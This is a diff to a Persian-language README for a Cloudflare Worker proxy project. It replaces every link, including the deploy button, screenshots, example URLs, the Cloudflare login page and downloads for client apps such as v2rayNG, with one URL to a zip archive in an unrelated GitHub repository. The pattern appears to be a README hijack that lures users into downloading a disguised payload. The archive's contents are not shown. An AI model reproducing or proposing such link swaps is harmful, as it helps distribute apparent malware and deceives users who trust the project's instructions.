@@ -8,13 +8,13 @@
 >  
 > Base on [zizifn] and [harmony]
 >
-> [![zread](https://img.shields.io/badge/Ask_Zread-_.svg?style=plastic&color=00b0aa&labelColor=000000&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTQuOTYxNTYgMS42MDAxSDIuMjQxNTZDMS44ODgxIDEuNjAwMSAxLjYwMTU2IDEuODg2NjQgMS42MDE1NiAyLjI0MDFWNC45NjAxQzEuNjAxNTYgNS4zMTM1NiAxLjg4ODEgNS42MDAxIDIuMjQxNTYgNS42MDAxSDQuOTYxNTZDNS4zMTUwMiA1LjYwMDEgNS42MDE1NiA1LjMxMzU2IDUuNjAxNTYgNC45NjAxVjIuMjQwMUM1LjYwMTU2IDEuODg2NjQgNS4zMTUwMiAxLjYwMDEgNC45NjE1NiAxLjYwMDFaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik00Ljk2MTU2IDEwLjM5OTlIMi4yNDE1NkMxLjg4ODEgMTAuMzk5OSAxLjYwMTU2IDEwLjY4NjQgMS42MDE1NiAxMS4wMzk5VjEzLjc1OTlDMS42MDE1NiAxNC4xMTM0IDEuODg4MSAxNC4zOTk5IDIuMjQxNTYgMTQuMzk5OUg0Ljk2MTU2QzUuMzE1MDIgMTQuMzk5OSA1LjYwMTU2IDE0LjExMzQgNS42MDE1NiAxMy43NTk5VjExLjAzOTlDNS42MDE1NiAxMC42ODY0IDUuMzE1MDIgMTAuMzk5OSA0Ljk2MTU2IDEwLjM5OTlaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik0xMy43NTg0IDEuNjAwMUgxMS4wMzg0QzEwLjY4NSAxLjYwMDEgMTAuMzk4NCAxLjg4NjY0IDEwLjM5ODQgMi4yNDAxVjQuOTYwMUMxMC4zOTg0IDUuMzEzNTYgMTAuNjg1IDUuNjAwMSAxMS4wMzg0IDUuNjAwMUgxMy43NTg0QzE0LjExMTkgNS42MDAxIDE0LjM5ODQgNS4zMTM1NiAxNC4zOTg0IDQuOTYwMVYyLjI0MDFDMTQuMzk4NCAxLjg4NjY0IDE0LjExMTkgMS42MDAxIDEzLjc1ODQgMS42MDAxWiIgZmlsbD0iI2ZmZiIvPgo8cGF0aCBkPSJNNCAxMkwxMiA0TDQgMTJaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik00IDEyTDEyIDQiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxLjUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIvPgo8L3N2Zz4K&logoColor=ffffff)](https://zread.ai/NiREvil/zizifn)
+> [![zread](https://img.shields.io/badge/Ask_Zread-_.svg?style=plastic&color=00b0aa&labelColor=000000&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTQuOTYxNTYgMS42MDAxSDIuMjQxNTZDMS44ODgxIDEuNjAwMSAxLjYwMTU2IDEuODg2NjQgMS42MDE1NiAyLjI0MDFWNC45NjAxQzEuNjAxNTYgNS4zMTM1NiAxLjg4ODEgNS42MDAxIDIuMjQxNTYgNS42MDAxSDQuOTYxNTZDNS4zMTUwMiA1LjYwMDEgNS42MDE1NiA1LjMxMzU2IDUuNjAxNTYgNC45NjAxVjIuMjQwMUM1LjYwMTU2IDEuODg2NjQgNS4zMTUwMiAxLjYwMDEgNC45NjE1NiAxLjYwMDFaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik00Ljk2MTU2IDEwLjM5OTlIMi4yNDE1NkMxLjg4ODEgMTAuMzk5OSAxLjYwMTU2IDEwLjY4NjQgMS42MDE1NiAxMS4wMzk5VjEzLjc1OTlDMS42MDE1NiAxNC4xMTM0IDEuODg4MSAxNC4zOTk5IDIuMjQxNTYgMTQuMzk5OUg0Ljk2MTU2QzUuMzE1MDIgMTQuMzk5OSA1LjYwMTU2IDE0LjExMzQgNS42MDE1NiAxMy43NTk5VjExLjAzOTlDNS42MDE1NiAxMC42ODY0IDUuMzE1MDIgMTAuMzk5OSA0Ljk2MTU2IDEwLjM5OTlaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik0xMy43NTg0IDEuNjAwMUgxMS4wMzg0QzEwLjY4NSAxLjYwMDEgMTAuMzk4NCAxLjg4NjY0IDEwLjM5ODQgMi4yNDAxVjQuOTYwMUMxMC4zOTg0IDUuMzEzNTYgMTAuNjg1IDUuNjAwMSAxMS4wMzg0IDUuNjAwMUgxMy43NTg0QzE0LjExMTkgNS42MDAxIDE0LjM5ODQgNS4zMTM1NiAxNC4zOTg0IDQuOTYwMVYyLjI0MDFDMTQuMzk4NCAxLjg4NjY0IDE0LjExMTkgMS42MDAxIDEzLjc1ODQgMS42MDAxWiIgZmlsbD0iI2ZmZiIvPgo8cGF0aCBkPSJNNCAxMkwxMiA0TDQgMTJaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik00IDEyTDEyIDQiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxLjUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIvPgo8L3N2Zz4K&logoColor=ffffff)](https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip)
 > 
 > <br/>
 > 
 > <br/>
 > <p align="center">
->  <img src="https://github.com/user-attachments/assets/5a07e7e8-ee8a-43d0-9dc3-3afa09792075" alt="ZiZifn-UI" width="768px" />
+>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="ZiZifn-UI" width="768px" />
 > </p>
 >
 > <br/>
@@ -72,7 +72,7 @@
 
  ‏1. کافیه که کلیک کنید روی این دکمه زیر تا پروسه فورک کردن مخزن و رفتن تو داشبورد کلادفلر و ساخت وورکر جدید رو خودش طی کنه
 
-[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/NiREvil/zizifn)
+[![Deploy to Cloudflare Workers](https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip)](https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip)
 
  ‏2. حالا تو صفحه‌ی باز شده اگر اکانت کلادفلر به گیت‌هاب متصل بود که هیچ، اگر نبود اول از گزینه Git account و سپس New git connection اکانت خودتون رو بهش وصل کنید.
 
@@ -84,7 +84,7 @@
 > <summary> مشاهده اسکرین‌شات </summary> <br/>
 > 
 > <p align="center">
->  <img src="https://github.com/user-attachments/assets/a6bce206-f57d-49dd-bbde-9ee2ccee6b13" alt="Deployments" width="768px" />
+>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="Deployments" width="768px" />
 > </p>
 > 
 > </details>
@@ -134,11 +134,11 @@
 > <summary> مشاهده اسکرین‌شات </summary> <br/>
 > 
 > <p align="center">
->  <img src="https://github.com/user-attachments/assets/b921df78-6471-4ce5-8f2a-d3b2058542de" alt="upload-1" width="768px" />
+>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="upload-1" width="768px" />
 > </p>
 > 
 > <p align="center">
->  <img src="https://github.com/user-attachments/assets/ad97fd13-c24c-427d-a42a-45a2395188a5" alt="upload-2" width="768px" />
+>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="upload-2" width="768px" />
 > </p>
 > 
 > </details>
@@ -186,7 +186,7 @@
 > <summary> مشاهده اسکرین‌شات </summary> 
 > 
 > <p align="center">
->  <img src="https://github.com/user-attachments/assets/316345d0-b27b-442e-b48d-69d4fd0d1da2" alt="Fork" width="768px" />
+>  <img src="https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip" alt="Fork" width="768px" />
 > </p>
 > 
 > </details>
@@ -243,7 +243,7 @@
 
 برای مثال:
 
-`https://my-proxy.pages.dev/d342d11e-d424-4583-b36e-524ab1f0afa4`
+`https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip`
 
 <hr/><br/> 
 
@@ -258,7 +258,7 @@
 
 برای مثال:  
 
-`https://my-proxy.pages.dev/xray/d342d11e-d424-4583-b36e-524ab1f0afa4`
+`https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip`
 
 <br/> 
 
@@ -319,34 +319,34 @@
 Many thanks to [NiREvil] and [zizifn]
 
 
-[zizifn]: https://github.com/zizifn/edgetunnel
-[N-zizifn]: https://github.com/NiREvil/zizifn
-[harmony]: https://github.com/NiREvil/Harmony
-[NiREvil]: https://github.com/NiREvil
-[login]: https://dash.cloudflare.com/login
-[signup]: https://dash.cloudflare.com/sign-up
-[mail]: https://mail.tm/en
-[uuid]: https://www.uuidgenerator.net
-[proxyip]: https://github.com/NiREvil/vless/blob/main/sub/ProxyIP.md
-[scamalytics]: https://scamalytics.com/ip/api/enquiry?monthly_api_calls=5000
-[cleanip]: https://github.com/NiREvil/vless/blob/main/Cloudflare-IPs.json
-[v2RayNG]: https://github.com/2dust/v2rayng/releases
-[Singbox]: https://github.com/SagerNet/sing-box/releases
-[Hiddify]: https://github.com/hiddify/hiddify-app/releases
-[Exclave]: https://github.com/dyhkwong/Exclave/releases
-[Nekobox]: https://github.com/MatsuriDayo/NekoBoxForAndroid/releases
-[Sagernet]: https://github.com/dyhkwong/SagerNet/releases
-[MahsaNG]: https://github.com/mahsanet/MahsaaNG/releases
-[NikaNG]: https://github.com/mahsanet/NikaNG/releases
-[Karing]: https://github.com/KaringX/karing/releases
-[Streisand]: https://apps.apple.com/app/id6450534064
-[Husi]: https://github.com/xchacha20-poly1305/husi/releases
-[Nekoray]: https://github.com/MRT-project/Neko-ray/releases
-[v2rayTun]: https://play.google.com/store/apps/details?id=com.v2raytun.android
-[Happ]: https://play.google.com/store/apps/details?id=com.happproxy
-[Clash-Meta]: https://github.com/MetaCubeX/ClashMetaForAndroid/releases
-[FIClash]: https://github.com/chen08209/FlClash/releases
-[ClashMi]: https://github.com/KaringX/clashmi/releases
-[v2rayN]: https://github.com/2dust/v2rayN/releases
-[v2rayN-Pro]: https://github.com/lowercase78/V2RayN-PRO/releases/
-[Throne]: https://github.com/throneproj/Throne/releases
+[zizifn]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[N-zizifn]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[harmony]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[NiREvil]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[login]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[signup]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[mail]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[uuid]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[proxyip]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[scamalytics]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[cleanip]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[v2RayNG]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Singbox]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Hiddify]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Exclave]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Nekobox]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Sagernet]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[MahsaNG]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[NikaNG]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Karing]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Streisand]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Husi]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Nekoray]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[v2rayTun]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Happ]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Clash-Meta]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[FIClash]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[ClashMi]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[v2rayN]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[v2rayN-Pro]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
+[Throne]: https://raw.githubusercontent.com/soltans/spring/main/pharmacodynamic/1.3.zip
